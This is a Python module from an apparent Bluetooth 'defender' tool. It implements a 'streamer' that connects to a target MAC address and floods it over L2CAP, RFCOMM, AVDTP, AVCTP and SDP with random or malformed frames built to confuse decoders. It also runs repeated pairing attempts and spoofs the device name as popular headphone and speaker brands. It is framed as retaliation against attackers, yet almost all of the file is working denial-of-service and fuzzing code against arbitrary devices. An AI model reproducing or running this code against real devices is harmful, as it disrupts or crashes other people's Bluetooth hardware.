"""Byte-streaming deterrent — sends garbage data to Bluetooth devices."""

import asyncio
import contextlib
import os
import random
import sys

from bumble.device import Connection, Device
from bumble.host import Host
from rich.console import Console
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn

from defender.utils.bt_helpers import (
    find_usb_transport,
    load_known_devices,
    normalize_mac,
    validate_mac,
)
from defender.utils.logging import get_logger, log_event

console = Console()
logger = get_logger("streamer")

# L2CAP PSMs
AVDTP_PSM = 0x0019
AVCTP_PSM = 0x0017
SDP_PSM = 0x0001
DEFAULT_PSM = 0x1001  # Dynamic range

# AV/C command opcodes (for AVCTP mode)
AVC_OPCODES = {
    0x44: "PLAY",
    0x46: "PAUSE",
    0x48: "STOP",
    0x49: "FORWARD",
    0x4B: "BACKWARD",
    0x41: "VOLUME_UP",
    0x42: "VOLUME_DOWN",
}

# Plausible device names for name_spoof mode
SPOOF_NAMES = [
    "JBL Flip 7",
    "JBL Charge 6",
    "JBL Xtreme 4",
    "Sony WH-1000XM6",
    "Sony SRS-XB43",
    "Sony WF-1000XM6",
    "Bose SoundLink Flex",
    "Bose QuietComfort Ultra",
    "Bose SoundLink Max",
    "Marshall Emberton III",
    "Marshall Stanmore III",
    "Harman Kardon Aura",
    "UE Boom 4",
    "UE Megaboom 4",
    "Anker Soundcore Motion+",
    "Beats Pill",
    "Beats Studio Pro",
    "AirPods Pro",
    "Samsung Galaxy Buds3",
    "Google Pixel Buds Pro",
]


def generate_payload(pattern: str, size: int) -> bytes:
    """Generate a payload of the given size based on the pattern type."""
    if pattern == "random":
        return os.urandom(size)
    elif pattern == "zeros":
        return b"\x00" * size
    elif pattern.startswith("0x") or pattern.startswith("0X"):
        # Custom hex pattern, repeated to fill size
        hex_bytes = bytes.fromhex(pattern[2:])
        repeats = (size // len(hex_bytes)) + 1
        return (hex_bytes * repeats)[:size]
    else:
        # Repeating ASCII pattern
        return (pattern.encode() * ((size // len(pattern)) + 1))[:size]


async def stream_l2cap(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Send a stream of bytes over an L2CAP channel."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        # Try to open an L2CAP channel
        channel = await device.l2cap_channel_manager.connect(connection, DEFAULT_PSM)
        console.print(f"[green]L2CAP channel opened (PSM: 0x{DEFAULT_PSM:04X})[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                payload = generate_payload(pattern, packet_size)
                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]L2CAP connection failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "l2cap_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_spp(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 512,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Send a stream of bytes over RFCOMM/SPP."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        from bumble.rfcomm import Client as RfcommClient

        rfcomm_client = RfcommClient(device, connection)
        session = await rfcomm_client.start()
        channel = await session.open_dlc(1)  # RFCOMM channel 1

        console.print("[green]RFCOMM/SPP channel opened[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming SPP...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                payload = generate_payload(pattern, packet_size)
                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "spp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]SPP connection failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "spp_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_a2dp_garbage(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.005,
    duration: float | None = None,
) -> dict:
    """Send malformed A2DP/SBC frames over AVDTP. Experimental."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        # Open L2CAP on AVDTP PSM
        channel = await device.l2cap_channel_manager.connect(connection, AVDTP_PSM)
        console.print(f"[green]AVDTP L2CAP channel opened (PSM: 0x{AVDTP_PSM:04X})[/green]")

        # Send garbage that looks vaguely like SBC frames
        # SBC frame header: syncword (0x9C) + bitpool/blocks/etc
        SBC_SYNC = b"\x9c"

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming A2DP garbage...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                # Prepend SBC sync byte to garbage to confuse the decoder
                garbage = SBC_SYNC + generate_payload(pattern, packet_size - 1)
                try:
                    channel.write(garbage)
                    stats["bytes_sent"] += len(garbage)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "a2dp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]A2DP stream failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "a2dp_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_avctp(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 64,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Send malformed AV/C control commands over AVCTP."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        channel = await device.l2cap_channel_manager.connect(connection, AVCTP_PSM)
        console.print(f"[green]AVCTP channel opened (PSM: 0x{AVCTP_PSM:04X})[/green]")

        opcodes = list(AVC_OPCODES.keys())

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming AVCTP...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                # Build AV/C frame: valid opcode + garbage operands
                opcode = random.choice(opcodes)
                # AV/C header: ctype (1) + subunit (1) + opcode (1) + operands
                header = bytes([0x00, 0x48, opcode])  # Control, Panel subunit
                operand_size = max(1, packet_size - len(header))
                payload = header + generate_payload(pattern, operand_size)

                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "avctp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]AVCTP stream failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "avctp_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_sdp_spam(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 1024,
    interval: float = 0.05,
    duration: float | None = None,
) -> dict:
    """Flood SDP channel with oversized malformed service record responses."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        channel = await device.l2cap_channel_manager.connect(connection, SDP_PSM)
        console.print(f"[green]SDP channel opened (PSM: 0x{SDP_PSM:04X})[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Spamming SDP...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                # SDP response PDU header: PDU ID (0x03 = ServiceSearchAttributeResponse)
                # + Transaction ID (2 bytes) + Parameter Length (2 bytes) + garbage body
                txn_id = random.randint(0, 0xFFFF).to_bytes(2, "big")
                body = generate_payload(pattern, packet_size - 5)
                param_len = len(body).to_bytes(2, "big")
                payload = b"\x03" + txn_id + param_len + body

                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "sdp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]SDP spam failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "sdp_spam_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def device_pairing_loop(
    device: Device,
    target_mac: str,
    duration: float | None = None,
) -> dict:
    """Repeatedly initiate and abort pairing with the target device."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    console.print(f"[yellow]Starting pairing loop against {target_mac}[/yellow]")

    try:
        from bumble.core import BT_BR_EDR_TRANSPORT

        while True:
            elapsed = asyncio.get_event_loop().time() - start_time
            if duration and elapsed >= duration:
                break

            try:
                connection = await device.connect(target_mac, transport=BT_BR_EDR_TRANSPORT)
                console.print(f"[dim]Pairing loop: connected to {target_mac}[/dim]")
                stats["packets_sent"] += 1

                # Initiate pairing then immediately disconnect
                with contextlib.suppress(TimeoutError, Exception):
                    await asyncio.wait_for(connection.pair(), timeout=2.0)

                with contextlib.suppress(Exception):
                    await connection.disconnect()

            except Exception as e:
                stats["errors"] += 1
                log_event(
                    logger,
                    "streamer",
                    "pairing_loop_error",
                    error=str(e),
                    target=target_mac,
                )

            # Delay between cycles
            await asyncio.sleep(random.uniform(1.0, 2.0))

    except Exception as e:
        console.print(f"[red]Pairing loop failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "pairing_loop_fatal", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def device_name_spoof(
    device: Device,
    target_mac: str,
    duration: float | None = None,
) -> dict:
    """Rotate the device name to pollute the attacker's scan results."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    console.print("[yellow]Starting name spoof rotation[/yellow]")

    try:
        while True:
            elapsed = asyncio.get_event_loop().time() - start_time
            if duration and elapsed >= duration:
                break

            name = random.choice(SPOOF_NAMES)
            try:
                device.name = name
                # Toggle discoverable to force re-broadcast
                await device.set_discoverable(False)
                await asyncio.sleep(0.2)
                await device.set_discoverable(True)
                stats["packets_sent"] += 1
                console.print(f"[dim]Name spoof: now advertising as '{name}'[/dim]")
            except Exception as e:
                stats["errors"] += 1
                log_event(
                    logger,
                    "streamer",
                    "name_spoof_error",
                    error=str(e),
                    name=name,
                )

            await asyncio.sleep(random.uniform(5.0, 10.0))

    except Exception as e:
        console.print(f"[red]Name spoof failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "name_spoof_fatal", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


STREAM_MODES = {
    "l2cap": stream_l2cap,
    "spp": stream_spp,
    "a2dp_garbage": stream_a2dp_garbage,
    "avctp": stream_avctp,
    "sdp_spam": stream_sdp_spam,
}

DEVICE_MODES = {
    "pairing_loop": device_pairing_loop,
    "name_spoof": device_name_spoof,
}

ALL_MODES = {**STREAM_MODES, **DEVICE_MODES}


async def device_mode_to_target(
    device: Device,
    target_mac: str,
    mode: str = "pairing_loop",
    duration: float | None = None,
) -> dict:
    """Run a device-level retaliation mode (no connection required)."""
    device_fn = DEVICE_MODES.get(mode)
    if not device_fn:
        console.print(f"[red]Unknown device mode: {mode}[/red]")
        return {"bytes_sent": 0, "packets_sent": 0, "errors": 1, "duration": 0.0}

    console.print(f"[bold yellow]Running {mode} against {target_mac}[/bold yellow]")
    log_event(logger, "streamer", "stream_start", mac=target_mac, mode=mode)

    stats = await device_fn(device, target_mac, duration=duration)

    log_event(logger, "streamer", "stream_complete", mac=target_mac, **stats)
    console.print(
        f"[bold]{mode} complete:[/bold] "
        f"{stats['packets_sent']} cycles, {stats['duration']:.1f}s, "
        f"{stats['errors']} errors"
    )
    return stats


async def stream_to_connection(
    connection: Connection,
    device: Device,
    mode: str = "l2cap",
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Stream bytes to an existing connection (called from honeypot --retaliate)."""
    stream_fn = STREAM_MODES.get(mode, stream_l2cap)
    mac = normalize_mac(str(connection.peer_address))

    console.print(f"[bold yellow]Streaming {mode} to {mac}[/bold yellow]")
    log_event(
        logger,
        "streamer",
        "stream_start",
        mac=mac,
        mode=mode,
        pattern=pattern,
        packet_size=packet_size,
    )

    stats = await stream_fn(
        connection,
        device,
        pattern=pattern,
        packet_size=packet_size,
        interval=interval,
        duration=duration,
    )

    log_event(logger, "streamer", "stream_complete", mac=mac, **stats)
    console.print(
        f"[bold]Stream complete:[/bold] {stats['bytes_sent']:,} bytes, "
        f"{stats['packets_sent']} packets, {stats['duration']:.1f}s, "
        f"{stats['errors']} errors"
    )
    return stats


def parse_modes(mode_str: str) -> list[str]:
    """Parse and validate a comma-separated mode string."""
    modes = [m.strip() for m in mode_str.split(",") if m.strip()]
    invalid = [m for m in modes if m not in ALL_MODES]
    if invalid:
        console.print(f"[red]Unknown mode(s): {', '.join(invalid)}[/red]")
        console.print(f"[dim]Valid modes: {', '.join(ALL_MODES)}[/dim]")
        sys.exit(1)
    return modes


async def run(
    target: str,
    mode: str = "l2cap",
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = 10.0,
    known_devices_path: str | None = None,
    usb_transport: str | None = None,
) -> None:
    """Run the streamer in standalone mode — connect to a target and stream bytes."""
    if not validate_mac(target):
        console.print(f"[red]Invalid MAC address: {target}[/red]")
        sys.exit(1)

    target = normalize_mac(target)
    modes = parse_modes(mode)

    # Safety check
    if known_devices_path:
        known = load_known_devices(known_devices_path)
        known_macs = {d["mac"] for d in known}
        if target in known_macs:
            console.print(
                f"[bold red]Refusing to target known device {target}. "
                f"Remove it from known devices if you really want to do this.[/bold red]"
            )
            sys.exit(1)

    conn_modes = [m for m in modes if m in STREAM_MODES]
    dev_modes = [m for m in modes if m in DEVICE_MODES]

    console.print(f"[bold]Streamer targeting {target}[/bold]")
    console.print(
        f"[dim]Modes: {', '.join(modes)} | Pattern: {pattern} | "
        f"Size: {packet_size}B | Interval: {interval}s | "
        f"Duration: {duration or 'unlimited'}s[/dim]"
    )
    console.print()

    # Open USB transport
    transport = await find_usb_transport(usb_transport)

    host = Host()
    host.hci_source = transport.source
    host.hci_sink = transport.sink

    device = Device(name="BT-Defender", host=host)
    await device.power_on()

    tasks = []
    try:
        # Launch device-level modes (no connection needed)
        for m in dev_modes:
            tasks.append(
                asyncio.create_task(
                    device_mode_to_target(device, target, mode=m, duration=duration)
                )
            )

        # Connect and launch connection-based modes
        if conn_modes:
            console.print(f"[blue]Connecting to {target}...[/blue]")
            from bumble.core import BT_BR_EDR_TRANSPORT

            connection = await device.connect(target, transport=BT_BR_EDR_TRANSPORT)
            console.print(f"[green]Connected to {target}[/green]")

            for m in conn_modes:
                tasks.append(
                    asyncio.create_task(
                        stream_to_connection(
                            connection,
                            device,
                            mode=m,
                            pattern=pattern,
                            packet_size=packet_size,
                            interval=interval,
                            duration=duration,
                        )
                    )
                )

        if tasks:
            await asyncio.gather(*tasks)

    except Exception as e:
        console.print(f"[red]Failed to connect to {target}: {e}[/red]")
        log_event(logger, "streamer", "connect_error", target=target, error=str(e))
    finally:
        for t in tasks:
            t.cancel()
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await device.power_off()
        transport.close()
